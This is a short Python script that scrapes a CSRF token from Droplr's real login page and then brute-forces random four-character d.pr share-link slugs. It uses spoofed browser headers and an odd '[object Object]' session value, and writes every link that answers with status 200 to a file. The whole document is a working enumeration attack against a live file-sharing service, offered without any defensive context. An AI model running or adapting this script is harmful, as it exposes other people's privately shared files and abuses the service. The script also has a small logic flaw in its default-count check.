import string
import random
import sys
import requests

loginUrl = 'https://auth.droplr.com/login'
count = int(sys.argv[1])

if count == None:
    count = 100

s = requests.Session()
response = s.get(loginUrl)

csrfToken = response.text.split('<input type="hidden" name="_csrf" id="_csrf" value="')[1].split('"')[0]

payload = {
    "_csrf": csrfToken,
    "session": "[object Object]",
    "email": "",
    "password": ""
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://auth.droplr.com",
    "Referer": "https://auth.droplr.com/login?callback=https://d.pr/auth",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.8',
    'X-Requested-With': 'XMLHttpRequest'
}

def generate_slug(size=4, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

for i in range(count):
    slug = generate_slug()
    link = 'https://d.pr/' + slug
    r = s.post(link, headers=headers, data=payload)
    print(r.status_code)
    if r.status_code == 200:
        print(link + ' is valid')
        fp = open('valid_slugs.txt', 'a')
        fp.write(link + '\n')
        fp.close()